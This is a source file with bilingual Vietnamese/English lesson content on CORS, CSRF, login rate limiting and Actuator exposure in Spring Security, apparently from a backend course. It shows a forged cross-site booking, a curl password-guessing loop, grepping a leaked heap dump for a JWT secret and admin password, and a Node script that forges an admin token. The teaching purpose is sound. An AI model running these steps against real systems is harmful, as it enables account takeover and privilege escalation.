  <div class="kv"><span class="k">CSRF</span><span class="v">Cross-Site Request Forgery: a foreign page makes the victim's browser send an authenticated request.</span></div>
  <div class="kv"><span class="k">CSRF token</span><span class="v">A secret the real page sends back (here <code>X-XSRF-TOKEN</code>) and a foreign page cannot read.</span></div>
  <div class="kv"><span class="k">SameSite</span><span class="v">Cookie attribute (Strict, Lax, None) controlling whether cookies go on cross-site requests.</span></div>
  <div class="kv"><span class="k">BearerTokenResolver</span><span class="v">Spring Security component that finds the bearer token in a request.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Without <code>http.cors()</code> the preflight hits authentication and gets 401.</li>
  <li>Explicit origins: 200 for the frontend, 403 for others; <code>*</code> + credentials: 500 on every request; pattern <code>*</code> + credentials: reflects any origin (the dangerous one).</li>
  <li>CSRF needs an automatically attached credential; a JWT in the header has none (forged request 401).</li>
  <li>A JWT in a cookie was forged successfully — and stayed forgeable with CSRF enabled, because the resource server skips CSRF for bearer-token requests.</li>
  <li>APIs: tokens in headers, explicit CORS list, CSRF off. Cookie-based auth: sessions + real CSRF + SameSite.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS', '🌐', 'MDN — Cross-Origin Resource Sharing', 'Simple requests, preflight, credentials, every header.')}
${tl('https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html', '🍃', 'Spring Security — CSRF', 'When to use it, the SPA preset, and how bearer tokens interact.')}
${tl('https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties', '🕵️', 'James Kettle — Exploiting CORS misconfigurations for Bitcoins and bounties', 'The 2016 research behind experiment 4.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', '📋', 'OWASP CSRF Prevention Cheat Sheet', 'Tokens, SameSite, Fetch Metadata.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: <code>labflow.DemoApp</code> (<code>BaoMat</code> with <code>c10.cors</code>, <code>c10.cookie</code>, <code>c10.csrf</code>) in <code>lab/c10/app</code>, Spring Boot 4.1.2, Spring Security 7.1.2 (20/11/2026).</li>
  <li>J. Kettle, AppSec USA, 10/2016; W. Zeller and E. W. Felten, "Cross-Site Request Forgeries: Exploitation and Prevention", Princeton, 2008.</li>
</ul>
</div>
`;

const L104_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.4</span>
<h2>CORS và CSRF cho API dùng JWT</h2>
<p class="lead">CORS và CSRF là hai chủ đề trình duyệt mà buổi phỏng vấn backend nào cũng chạm tới, còn phần lớn dự án thì cấu hình bằng cách chép một đoạn mã cho tới khi dòng chữ đỏ trong console biến mất. Cả hai đều xoay quanh cùng một nhân vật — chính trình duyệt của nạn nhân, đang mở một trang do kẻ tấn công điều khiển. Trong bài này ta đọc phản hồi preflight thật của bốn cấu hình CORS (một cái làm sập mọi request, một cái nguy hiểm mà trông hoàn hảo), rồi giả mạo một lượt đặt xuyên site và nhìn lớp chống CSRF của Spring Security tự tắt chỉ vì một bean trông vô hại.</p>

<h3>Đời thường trước đã</h3>
<p><strong>CORS.</strong> Một shipper của công ty X muốn mang kiện hàng lên văn phòng LabFlow. Lễ tân (trình duyệt) gọi điện lên trước: "Văn phòng có nhận shipper do công ty X gửi, mang loại hàng này không?" Cuộc gọi đó là <em>preflight</em>. Trên lầu nói không, shipper ngồi đợi ở sảnh. Lễ tân bảo vệ <em>túi đồ của chính vị khách</em> — cookie của bạn và những câu trả lời bạn đọc được — chứ không bảo vệ văn phòng: ai cũng vẫn đi được lên văn phòng bằng cửa sau (curl, Postman, một server).</p>
<p><strong>CSRF.</strong> Ai đó lén nhét một tờ đơn đặt hàng đã điền sẵn vào khay thư đi của bạn. Trợ lý đóng dấu công ty lên mọi tờ trong khay rồi gửi đi. Con dấu là cookie của bạn, được trình duyệt tự gắn vào mọi request tới site đó — kể cả khi request do một trang khác khởi động. Cross-Site Request Forgery (giả mạo request xuyên site) là khiến trình duyệt của bạn gửi một request bạn không hề muốn gửi, kèm theo thông tin đăng nhập của bạn.</p>

<h3>Origin và preflight trong một đoạn</h3>
<p><em>Origin</em> là giao thức + tên máy + cổng: <code>https://labflow.vn</code> và <code>https://api.labflow.vn</code> là hai origin khác nhau. Theo chính sách cùng nguồn gốc (same-origin policy), JavaScript ở origin này được gửi request tới origin khác nhưng không được <em>đọc</em> phản hồi, trừ khi server trả <code>Access-Control-Allow-Origin</code>. Với request không "đơn giản" — có header <code>Authorization</code>, <code>Content-Type: application/json</code>, phương thức <code>PATCH</code> — trình duyệt gửi trước một <code>OPTIONS</code> kèm <code>Origin</code>, <code>Access-Control-Request-Method</code>, <code>Access-Control-Request-Headers</code>, và chỉ gửi request thật nếu câu trả lời cho phép. Frontend React gọi LabFlow kèm JWT sẽ kích hoạt preflight ở mọi tuyến mới.</p>

<h3>Cấu hình ta sẽ bật tắt</h3>
${MA104_CHAIN}
${MA104_CORS}

<h3>Thí nghiệm 1: không cấu hình CORS</h3>
${OUT104_NONE}
<ul>
  <li>Preflight đi qua chuỗi filter bảo mật như mọi request, không có token, nhận <strong>401</strong>. Trình duyệt báo "CORS error", lập trình viên bắt đầu rải <code>@CrossOrigin</code> khắp nơi — nguyên nhân thật là Spring Security chưa từng được báo về CORS.</li>
  <li><code>GET /labs</code> công khai từ <code>https://evil.example</code> trả 200 mà không có <code>Access-Control-Allow-Origin</code>. Request ĐÃ tới server; trình duyệt chỉ từ chối đưa thân phản hồi cho trang. CORS không phải tường lửa.</li>
</ul>

<h3>Thí nghiệm 2: danh sách origin tường minh (cách đúng)</h3>
${OUT104_DUNG}
<ul>
  <li><code>http.cors()</code> đặt một <code>CorsFilter</code> trước bước xác thực, nên preflight được trả lời mà không cần token: 200, origin được nhắc lại đúng từng chữ, phương thức, header, credentials và cache 1 giờ (<code>Max-Age</code>).</li>
  <li>Origin lạ nhận 403 "Invalid CORS request" — cho cả preflight lẫn request thật, kể cả ở <code>/labs</code> công khai.</li>
  <li><code>Vary: Origin</code> báo cho cache và CDN rằng câu trả lời phụ thuộc origin; thiếu nó, một cache có thể đưa câu trả lời CORS của site này cho site khác.</li>
</ul>

<h3>Thí nghiệm 3: "cho tất cả" — <code>*</code> kèm credentials</h3>
${OUT104_SAO}
<p>Mọi request, kể cả <code>/labs</code> công khai, trả <strong>500</strong>. Spring từ chối tổ hợp này vì trình duyệt cũng cấm (origin đại diện <code>*</code> không được đi cùng credentials). Để ý LÚC nó hỏng: lúc chạy request, không phải lúc khởi động. Ứng dụng vẫn lên, health check có thể vẫn xanh, và mọi trang đều hỏng.</p>

<h3>Thí nghiệm 4: cái nguy hiểm — mẫu <code>*</code> kèm credentials</h3>
${OUT104_MAU}
<p>Đổi <code>addAllowedOrigin("*")</code> thành <code>addAllowedOriginPattern("*")</code> là lỗi 500 biến mất — nên dòng này rất phổ biến trên StackOverflow. Việc nó thật sự làm: nhắc lại BẤT KỲ origin nào, kể cả <code>https://evil.example</code>, kèm <code>Access-Control-Allow-Credentials: true</code>. Nếu API nhận cookie, một trang ở bất kỳ site nào cũng gọi được nó bằng cookie của nạn nhân và <em>đọc</em> được câu trả lời. Phản hồi trông y hệt thí nghiệm 2. Chỉ có origin trong đó là sai.</p>
<p>Quy tắc: liệt kê origin tường minh (lấy từ cấu hình, theo từng môi trường). Mẫu chỉ dành cho tên miền con của chính bạn — <code>https://*.labflow.vn</code>, CÓ dấu chấm — và Lab 10 chấm đúng cái bẫy thiếu dấu chấm.</p>

<h3>CSRF: API dùng JWT có cần không?</h3>
<p>CSRF chỉ chạy được khi trình duyệt TỰ gắn thông tin đăng nhập. JWT mà frontend giữ trong bộ nhớ và gửi trong header <code>Authorization</code> không bao giờ được gắn tự động. JWT cất trong cookie thì có. Để so sánh, bản demo cho phép đọc access token từ cả cookie <code>at</code>:</p>
${MA104_COOKIE}

<h3>Thí nghiệm 5: một lượt đặt giả mạo, có và không có chống CSRF</h3>
<p>A: nhận token từ cookie, tắt CSRF (cách cấu hình JWT thường gặp). Một trang ở <code>https://evil.example</code> gửi một lượt đặt; trình duyệt tự gắn cookie:</p>
${OUT104_A}
<p>201 — một lượt đặt mang tên Lan mà Lan không hề tạo. B: vẫn cookie như trên, giờ bật <code>http.csrf(c -&gt; c.spa())</code> (cấu hình sẵn của Spring Security 7 cho ứng dụng một trang: token nằm trong cookie <code>XSRF-TOKEN</code> đọc được bằng JavaScript, gửi lại trong header <code>X-XSRF-TOKEN</code>):</p>
${OUT104_B}
<ul>
  <li>CSRF đã bật: cả <code>POST /auth/login</code> giờ cũng cần token (403, rồi 200 khi có). SPA phải GET một trang trước để nhận <code>XSRF-TOKEN</code>.</li>
  <li>Thế mà lượt đặt giả mạo <strong>vẫn thành công (201)</strong>. Dòng trace giải thích: resource server OAuth2 dặn <code>CsrfFilter</code> bỏ qua mọi request khớp <code>BearerTokenRequestMatcher</code> — "request mang bearer token thì không thể là CSRF". Bộ so khớp đó hỏi resolver CỦA TA, và resolver của ta nói cookie là bearer token. Lớp chống CSRF bị tắt đúng ở những request nó cần bảo vệ, không một lời cảnh báo.</li>
</ul>
<p>C: resolver mặc định (chỉ header), tắt CSRF:</p>
${OUT104_C}
<p>Request giả mạo chỉ có cookie giờ chỉ là một request ẩn danh: 401. Client thật, gửi <code>Authorization: Bearer</code>, chạy bình thường. Không cần token CSRF, vì không có gì được gửi tự động.</p>

<h3>Vậy LabFlow nên làm gì?</h3>
<ul>
  <li><strong>SPA trên trình duyệt + API JWT:</strong> access token trong bộ nhớ, gửi trong header; tắt CSRF; CORS với danh sách origin tường minh. Đó là thiết kế của Lab 9.</li>
  <li>Refresh token ở bài 9.5 là cookie, nên CSRF chạm được. Nó <code>HttpOnly</code>, <code>SameSite=Strict</code> và giới hạn <code>Path=/auth</code>; một lệnh <code>/auth/refresh</code> giả mạo chỉ xoay được token, còn access token mới nằm trong thân phản hồi mà trang của kẻ tấn công không đọc được (CORS).</li>
  <li><strong>Nếu muốn dùng cookie cho mọi thứ</strong> (không để token trong JavaScript), hãy dùng session phía server hoặc mô hình backend-for-frontend với lớp chống CSRF bình thường của Spring Security — không phải một <code>BearerTokenResolver</code> tự viết đọc cookie.</li>
  <li><code>SameSite=Lax</code> (mặc định của Chrome từ 2020 cho cookie không khai thuộc tính này) chặn phần lớn form POST xuyên site. Nó không giúp gì trước một tên miền con "hàng xóm" như <code>evil.labflow.vn</code>, vì đó được tính là cùng site.</li>
</ul>

<h3>🕵️ Góc hacker — CORS và bitcoin (2016), CSRF ở ngân hàng (2008)</h3>
<p><strong>2016.</strong> James Kettle của PortSwigger trình bày "Exploiting CORS misconfigurations for Bitcoins and bounties". Anh tìm ra các sàn bitcoin có API nhắc lại mọi <code>Origin</code> kèm cho phép credentials — đúng thí nghiệm 4. Một trang ở bất kỳ site nào cũng gọi được API của sàn bằng phiên của người đang xem và đọc được câu trả lời, gồm cả khoá API của người dùng, đủ để chuyển tiền đi. Cách vá chính là cách ở trên: danh sách origin tường minh.</p>
<p><strong>2008.</strong> William Zeller và Edward Felten (Princeton) công bố các vụ tấn công CSRF vào những site lớn. Ở ngân hàng ING Direct, một trang mà nạn nhân chỉ cần mở đã có thể thêm người nhận mới và chuyển tiền khỏi tài khoản nạn nhân, vì form của ngân hàng chỉ dựa vào cookie phiên. Họ cũng chỉ ra CSRF ở YouTube, The New York Times và MetaFilter. Cách vá: một token bí mật theo phiên mà trang lạ không đọc được.</p>
<p><strong>Bạn làm gì:</strong> origin chính xác theo từng môi trường; không bao giờ <code>allowedOriginPatterns("*")</code> kèm credentials; token trong header cho API; nếu cookie mang thông tin xác thực thì phải có chống CSRF thật và <code>SameSite</code>; trong CI dùng curl kiểm preflight từ một origin lạ.</p>

<h3>So với Node.js</h3>
<p>Gói <code>cors</code> của Express có đúng những cái bẫy này dưới tên khác: <code>cors({ origin: true, credentials: true })</code> nhắc lại origin của request, tức thí nghiệm 4. Một mảng origin tường minh là cách vá. Với CSRF, middleware <code>csurf</code> cũ đã bị khai tử năm 2022; lời khuyên hiện nay là cookie <code>SameSite</code> cộng một thư viện token double-submit, hoặc token trong header. Lập luận giống Spring: không có thông tin đăng nhập tự gắn thì không có CSRF.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li>Mỗi môi trường một danh sách CORS: <code>http://localhost:5173</code> thuộc về dev, không thuộc về production.</li>
  <li>"CORS error" trong console thường che một lỗi 401, 403 hay 500 ở preflight. Tái hiện bằng <code>curl -i -X OPTIONS</code> và đọc mã trạng thái trước.</li>
  <li>Ứng dụng di động và lời gọi giữa các server hoàn toàn không dùng CORS; chỉ trình duyệt dùng.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Preflight request là gì?"</strong> — Request <code>OPTIONS</code> trình duyệt gửi trước một request xuyên origin không đơn giản, để hỏi phương thức, header và origin có được phép không.</li>
  <li><strong>"CORS có bảo vệ API của tôi không?"</strong> — Không. Nó bảo vệ trình duyệt của người dùng khỏi những trang muốn đọc phản hồi bằng thông tin đăng nhập của họ; curl bỏ qua nó.</li>
  <li><strong>"Sao allowedOrigins không được là * khi có credentials?"</strong> — Trình duyệt cấm; Spring ném lỗi. Cách lách <code>allowedOriginPatterns("*")</code> nhắc lại mọi origin và còn tệ hơn.</li>
  <li><strong>"Dùng JWT có cần chống CSRF không?"</strong> — Không, khi token gửi trong header <code>Authorization</code>; có, khi token hoặc phiên nằm trong cookie.</li>
  <li><strong>"SameSite làm gì?"</strong> — Bảo trình duyệt không gửi cookie trong request xuyên site (Strict) hoặc trong request con và POST xuyên site (Lax). Một lớp mạnh, không phải lời giải CSRF trọn vẹn.</li>
</ol>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><ol>
  <li>Với mỗi cấu hình (none, dung, sao, mau), đoán mã trạng thái của preflight từ <code>https://evil.example</code> và câu trả lời có <code>Access-Control-Allow-Origin</code> không.</li>
  <li>Giải thích vì sao <code>GET /labs</code> từ <code>https://evil.example</code> trả 200 ở cấu hình "none" nhưng 403 ở "dung".</li>
  <li>Ở thí nghiệm 5B, CSRF đã bật mà lượt đặt giả mạo vẫn trả 201. Nêu tên bộ so khớp chịu trách nhiệm và thay đổi nào khiến nó áp lên cookie.</li>
</ol>
<p><strong>Đạt khi:</strong> bốn dự đoán khớp output, câu 2 nói rằng xử lý CORS chỉ xảy ra khi có cấu hình CORS, và câu 3 nêu <code>BearerTokenRequestMatcher</code> cùng <code>BearerTokenResolver</code> đọc cookie.</p></div>
${giai('Xem đáp án', `<p>none: 401, không có header. dung: 403 "Invalid CORS request", không có header. sao: 500 (IllegalArgumentException), không có header. mau: 200 kèm <code>Access-Control-Allow-Origin: https://evil.example</code> và credentials true. Không có <code>http.cors()</code> thì không có <code>CorsFilter</code>, origin không hề được kiểm và tuyến công khai trả lời bình thường (trình duyệt vẫn giấu thân phản hồi); có danh sách tường minh thì filter từ chối origin lạ. Resource server đăng ký <code>BearerTokenRequestMatcher</code> làm luật bỏ qua CSRF; nó dùng <code>BearerTokenResolver</code> đã cấu hình, và resolver của ta trả về cookie <code>at</code>.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Origin</span><span class="v">Giao thức + tên máy + cổng của một trang hay request.</span></div>
  <div class="kv"><span class="k">Same-origin policy</span><span class="v">Luật trình duyệt: trang không được đọc phản hồi từ origin khác nếu không được cho phép.</span></div>
  <div class="kv"><span class="k">CORS</span><span class="v">Cross-Origin Resource Sharing: header phản hồi nới lỏng chính sách cùng nguồn gốc.</span></div>
  <div class="kv"><span class="k">Preflight</span><span class="v">Request <code>OPTIONS</code> gửi trước một request xuyên origin không đơn giản.</span></div>
  <div class="kv"><span class="k">CSRF</span><span class="v">Giả mạo request xuyên site: trang lạ khiến trình duyệt nạn nhân gửi một request đã xác thực.</span></div>
  <div class="kv"><span class="k">Token CSRF</span><span class="v">Bí mật mà trang thật gửi lại (ở đây <code>X-XSRF-TOKEN</code>) còn trang lạ không đọc được.</span></div>
  <div class="kv"><span class="k">SameSite</span><span class="v">Thuộc tính cookie (Strict, Lax, None) quyết định cookie có đi theo request xuyên site không.</span></div>
  <div class="kv"><span class="k">BearerTokenResolver</span><span class="v">Thành phần Spring Security tìm bearer token trong request.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Không có <code>http.cors()</code> thì preflight đâm vào bước xác thực và nhận 401.</li>
  <li>Origin tường minh: 200 cho frontend, 403 cho người khác; <code>*</code> + credentials: 500 mọi request; mẫu <code>*</code> + credentials: nhắc lại mọi origin (cái nguy hiểm).</li>
  <li>CSRF cần một thông tin đăng nhập tự gắn; JWT trong header không có (request giả mạo 401).</li>
  <li>JWT trong cookie bị giả mạo thành công — và vẫn giả mạo được khi bật CSRF, vì resource server bỏ qua CSRF cho request mang bearer token.</li>
  <li>API: token trong header, danh sách CORS tường minh, tắt CSRF. Xác thực bằng cookie: session + chống CSRF thật + SameSite.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS', '🌐', 'MDN — Cross-Origin Resource Sharing', 'Request đơn giản, preflight, credentials, từng header.')}
${tl('https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html', '🍃', 'Spring Security — CSRF', 'Khi nào dùng, cấu hình sẵn cho SPA, và bearer token tương tác ra sao.')}
${tl('https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties', '🕵️', 'James Kettle — Exploiting CORS misconfigurations for Bitcoins and bounties', 'Nghiên cứu 2016 đứng sau thí nghiệm 4.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', '📋', 'OWASP CSRF Prevention Cheat Sheet', 'Token, SameSite, Fetch Metadata.')}

<h3>Nguồn</h3>
<ul>
  <li>Output trong bài: <code>labflow.DemoApp</code> (<code>BaoMat</code> với <code>c10.cors</code>, <code>c10.cookie</code>, <code>c10.csrf</code>) ở <code>lab/c10/app</code>, Spring Boot 4.1.2, Spring Security 7.1.2 (20/11/2026).</li>
  <li>J. Kettle, AppSec USA, 10/2016; W. Zeller và E. W. Felten, "Cross-Site Request Forgeries: Exploitation and Prevention", Princeton, 2008.</li>
</ul>
</div>
`;

// ===== Bài 10.5 =====
const OUT105_KHONG = out("########## không giới hạn\n$ while read pw; do curl -s -o /dev/null -w \"%{http_code}\\n\" -X POST /auth/login -d \"{\\\"username\\\":\\\"SE180124\\\",\\\"password\\\":\\\"$pw\\\"}\"; done < 100-mat-khau.txt | sort | uniq -c\n         1 200\n        86 401\n   thời gian: 6343 ms");
const MA105_RL = java("@Bean\nFilterRegistrationBean<Filter> gioiHanFilter(JsonMapper json,\n        @Value(\"${c10.rl.ten:5}\") int moiTen, @Value(\"${c10.rl.ip:20}\") int moiIp) {\n    Map<String, Bucket> theoTen = new ConcurrentHashMap<>(), theoIp = new ConcurrentHashMap<>();\n    Filter f = (req, res, chain) -> {\n        HttpServletRequest r = (HttpServletRequest) req;\n        if (!r.getMethod().equals(\"POST\")) { chain.doFilter(req, res); return; }\n        byte[] body = r.getInputStream().readAllBytes();               // đọc một lần, rồi trả lại cho controller\n        String ten = String.valueOf(json.readTree(body).path(\"username\").asString(\"\")).toLowerCase();\n        Bucket bTen = theoTen.computeIfAbsent(ten, k -> xo(moiTen));\n        Bucket bIp = theoIp.computeIfAbsent(r.getRemoteAddr(), k -> xo(moiIp));\n        ConsumptionProbe p = bIp.tryConsumeAndReturnRemaining(1);\n        if (p.isConsumed()) p = bTen.tryConsumeAndReturnRemaining(1);\n        HttpServletResponse w = (HttpServletResponse) res;\n        if (!p.isConsumed()) {\n            long giay = Math.max(1, (p.getNanosToWaitForRefill() + 999_999_999L) / 1_000_000_000L);   // làm tròn LÊN\n            w.setStatus(429);\n            w.setHeader(\"Retry-After\", String.valueOf(giay));\n            w.setContentType(\"application/problem+json\");\n            w.setCharacterEncoding(\"UTF-8\");                               // thiếu dòng này ⇒ ISO-8859-1, chữ Việt thành \"?\"\n            w.getWriter().write(\"{\\\"title\\\":\\\"Too Many Requests\\\",\\\"status\\\":429,\\\"detail\\\":\\\"thử lại sau \" + giay + \" giây\\\"}\");\n            return;\n        }\n        w.setHeader(\"X-RateLimit-Remaining\", String.valueOf(p.getRemainingTokens()));\n        chain.doFilter(new BodyDaDoc(r, body), res);\n    };\n    FilterRegistrationBean<Filter> reg = new FilterRegistrationBean<>(f);\n    reg.addUrlPatterns(\"/auth/login\");\n    reg.setOrder(Ordered.HIGHEST_PRECEDENCE);\n    return reg;\n}\n\n/** n lượt, hồi dần đủ n lượt mỗi phút (refillGreedy: hồi từng lượt một, không đợi hết phút). */\nstatic Bucket xo(int n) {\n    return Bucket.builder().addLimit(Bandwidth.builder().capacity(n).refillGreedy(n, Duration.ofMinutes(1)).build()).build();\n}");
const OUT105_CO = out("########## c10.rl=true (Bucket4j: 5 lượt/phút mỗi tên, 20 lượt/phút mỗi IP)\n$ (cùng vòng lặp)\n         5 401\n        95 429\n   thời gian: 1269 ms\n$ curl -i -X POST /auth/login -d \"{\\\"username\\\":\\\"SE180124\\\",\\\"password\\\":\\\"…\\\"}\"   (lần thứ 101)\nHTTP/1.1 429 \nRetry-After: 2\nContent-Type: application/problem+json;charset=UTF-8\n{\"title\":\"Too Many Requests\",\"status\":429,\"detail\":\"thử lại sau 2 giây\"}\n\n# Rải tên: 25 tài khoản khác nhau, mỗi tài khoản 1 lần, cùng một IP\n        20 401\n         5 429");
const OUT105_CHARSET = out("$ curl -i -X POST /auth/login -d \"{\\\"username\\\":\\\"SE180124\\\",\\\"password\\\":\\\"…\\\"}\"   (lần thứ 101)\nHTTP/1.1 429 \nRetry-After: 1\nContent-Type: application/problem+json;charset=ISO-8859-1\n{\"title\":\"Too Many Requests\",\"status\":429,\"detail\":\"th? l?i sau 1 gi�y\"}");
const PROPS105_LO = props("# 10.5 — cấu hình SAI hay gặp: \"mở hết Actuator cho tiện theo dõi\"\nmanagement.endpoints.web.exposure.include=*\n# Boot 4.1.2: include=* vẫn KHÔNG mở heapdump (404). Dòng dưới là thứ người ta chép từ mạng để \"sửa\" 404 đó.\nmanagement.endpoint.heapdump.access=unrestricted");
const OUT105_LO = out("########## profile lo: exposure.include=* + heapdump.access=unrestricted + permitAll /actuator/**\n$ curl -s /actuator | jq \".\\_links | keys | length\"\n21\n$ curl -s /actuator | jq -c \".\\_links | keys\"\n[\"beans\",\"conditions\",\"configprops\",\"configprops-prefix\",\"env\",\"env-toMatch\",\"flyway\",\"health\",\"health-path\",\"heapdump\",\"info\",\"loggers\",\"loggers-name\",\"mappings\",\"metrics\",\"metrics-requiredMetricName\",\"sbom\",\"sbom-id\",\"scheduledtasks\",\"self\",\"threaddump\"]\n$ curl -s /actuator/env | jq -c \".propertySources[] | .properties.LABFLOW_JWT_SECRET // empty\"\n{\"origin\":\"System Environment Property \\\"LABFLOW_JWT_SECRET\\\"\",\"value\":\"******\"}\n$ curl -s /actuator/mappings | grep -o \"/v0/[a-z/{}]*\" | sort -u\n/v0/bookings/mine\n/v0/bookings/search\n/v0/bookings/{id}\n/v0/bookings/{id}/approve\n/v0/me\n/v0/me/form\n$ time curl -s -o heap.hprof /actuator/heapdump && ls -lh heap.hprof\n   tải xong sau 485 ms · 74M\n$ strings heap.hprof | grep -m1 -A1 \"^LABFLOW_JWT_SECRET\" ; strings heap.hprof | grep -m1 -A1 \"^LABFLOW_ADMIN_PASSWORD\"\nLABFLOW_JWT_SECRET!\nc10-bi-mat-k…(bài che bớt)!\nLABFLOW_ADMIN_PASSWORD!\nAdmi…(bài che bớt)!\n$ strings heap.hprof | grep -c \"{bcrypt}\"\n1\n$ GIA=$(node ky.mjs \"<bí mật vừa nhặt>\")   # sub=admin, roles=[ADMIN]\n$ curl \"/bookings?studentCode=SE180124\" -H \"Authorization: Bearer $GIA\"\n{\"items\":[{\"id\":18,\"labCode\":\"IOT-01\",\"studentCode\":\"SE180124\",\"startAt\":\"2030-03-03T01:00:00\",\"endAt\":\"2030-03-03T02:00:00\",\"status\":\"APPROVED\",\"version\":1}],\"total\":1}\nHTTP 200");
const MA105_KY = js("// 10.5 — có bí mật HS256 là tự ký được token ADMIN (cùng cách của 9.3)\nimport crypto from 'node:crypto';\nconst b64 = (o) => Buffer.from(typeof o === 'string' ? o : JSON.stringify(o)).toString('base64url');\nconst now = Math.floor(Date.now() / 1000);\nconst dau = b64({ alg: 'HS256' }) + '.' + b64({ iss: 'labflow', sub: 'admin', roles: ['ADMIN'], iat: now, exp: now + 900 });\nconsole.log(dau + '.' + crypto.createHmac('sha256', process.argv[2]).update(dau).digest('base64url'));");
const PROPS105_DUNG = props("# 10.5 — cấu hình ĐÚNG: công khai đúng health, phần còn lại ở cổng quản trị riêng (không mở ra Internet) và cần ADMIN\nmanagement.endpoints.web.exposure.include=health,info,metrics\nmanagement.server.port=8081\nmanagement.endpoint.health.show-details=when-authorized");
const OUT105_DUNG = out("########## profile actdung: exposure health,info,metrics · management.server.port=8081\n   cổng 8080 /actuator/health     ⇒ HTTP 404\n   cổng 8080 /actuator/env        ⇒ HTTP 401\n   cổng 8080 /actuator/heapdump   ⇒ HTTP 401\n   cổng 8081 /actuator/health     ⇒ HTTP 200\n   cổng 8081 /actuator/env        ⇒ HTTP 401\n   cổng 8081 /actuator/heapdump   ⇒ HTTP 401\n   cổng 8081 /actuator/health     + token ADMIN ⇒ {\"components\":{\"db\":{\"details\":{\"database\":\"PostgreSQL\",\"validationQuery\":\"isValid()\"},\"st\n   cổng 8081 /actuator/metrics    + token ADMIN ⇒ {\"names\":[\"application.ready.time\",\"application.started.time\",\"disk.free\",\"disk.total\",\"ex");
const OUT105_GIT = out("$ git log --oneline\n<sha> chuyen bi mat sang bien moi truong\n<sha> them cau hinh JWT\n$ cat src/main/resources/application.properties\nspring.datasource.url=jdbc:postgresql://localhost:5432/labflow\nlabflow.jwt.secret=${LABFLOW_JWT_SECRET}\n$ docker run --rm -v \"$PWD\":/repo zricethezav/gitleaks:latest git /repo --redact -v\n    ○\n    │╲\n    │ ○\n    ○ ░\n    ░    gitleaks\nFinding:     labflow.jwt.secret=REDACTED\nSecret:      REDACTED\nRuleID:      generic-api-key\nEntropy:     4.743300\nFile:        src/main/resources/application.properties\nLine:        2\nCommit: …\nAuthor: …\nEmail: …\nDate: …\nFingerprint: …\n3:18AM INF 2 commits scanned.\n3:18AM INF scanned ~168 bytes (168 bytes) in 54.4ms\n3:18AM WRN leaks found: 1");

const L105_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.5</span>
<h2>Rate limiting, secrets and Actuator exposure</h2>
<p class="lead">Three mistakes that are not in any controller: a login endpoint that answers as fast as you can ask, a monitoring endpoint that hands out the application's memory, and a secret that was "removed" from the code but not from Git. In this lesson a script finds a password in 6.5 seconds, then hits a Bucket4j limit after five tries; a 74 MB heap dump downloaded without logging in yields the JWT signing key, and a token forged with it opens an admin-only page; and gitleaks finds a key in a commit that is no longer in the working tree.</p>

<h3>In everyday life first</h3>
<p>An ATM swallows the card after three wrong PINs, so guessing a 4-digit PIN is hopeless even though there are only 10,000 of them. A building's maintenance room has the cabinet with every master key; leaving it unlocked "so the technicians can work" opens every office at once. And writing the safe's combination in the shared office notebook, then crossing it out on the next page, does not help: the old page is still in the notebook.</p>

<h3>Part 1 — a login that answers every guess</h3>
<p>The attacker has a list of 100 likely passwords for An (in this demo the real one is number 87) and simply tries them:</p>
${OUT105_KHONG}
<p>86 wrong, then the right one, in 6.5 seconds — about 15 guesses per second from one laptop, even with BCrypt making each check cost ~60 ms (lesson 9.2). That is 1.3 million guesses a day from a single client; real attacks use leaked password lists and many machines. Slow hashing protects stolen hashes. It does not protect a login endpoint.</p>

<h3>A limit with Bucket4j: one bucket per user name, one per IP</h3>
<p>A <em>token bucket</em> holds N tokens; each attempt takes one; tokens flow back at a fixed rate. Empty bucket ⇒ 429. Two buckets because there are two attacks: many guesses at one account (bucket per user name, 5 per minute) and one machine trying a few passwords on many accounts (bucket per IP, 20 per minute). The filter is a plain servlet filter registered for <code>/auth/login</code>, ahead of the Spring Security chain:</p>
${MA105_RL}
${OUT105_CO}
<ul>
  <li>Five wrong answers, then 95 refusals. The real password at line 87 was never even checked. The loop also got <em>faster</em> (1.3 s): a 429 costs no BCrypt.</li>
  <li><code>Retry-After</code> tells well-behaved clients when to come back; the body is a ProblemDetail like the rest of the API.</li>
  <li>Spraying — 25 different accounts, one try each — passes the per-user buckets but empties the per-IP bucket after 20.</li>
</ul>
<p>A bug we hit while writing this filter, worth knowing: before calling <code>setCharacterEncoding("UTF-8")</code> the raw response went out as ISO-8859-1 and the Vietnamese message arrived broken:</p>
${OUT105_CHARSET}
<p>Writing to the servlet response directly bypasses Spring's message converters, so nothing sets the charset for you.</p>

<h3>Design choices around the limit</h3>
<ul>
  <li><strong>Limit, don't lock.</strong> Locking an account after N failures lets anyone lock any student out the night before an exam. Slow down per account and per source; alert on volume.</li>
  <li><strong>Memory is per instance.</strong> These buckets live in one JVM. With three instances behind a load balancer the attacker gets three times the budget, and a restart resets it. Bucket4j can keep buckets in Redis (Chapter 13).</li>
  <li><strong>The real client IP.</strong> Behind a reverse proxy, <code>getRemoteAddr()</code> is the proxy for everyone — one IP bucket for the whole school. Configure <code>server.forward-headers-strategy</code> and trust <code>X-Forwarded-For</code> only from your own proxy, or the attacker sets that header himself.</li>
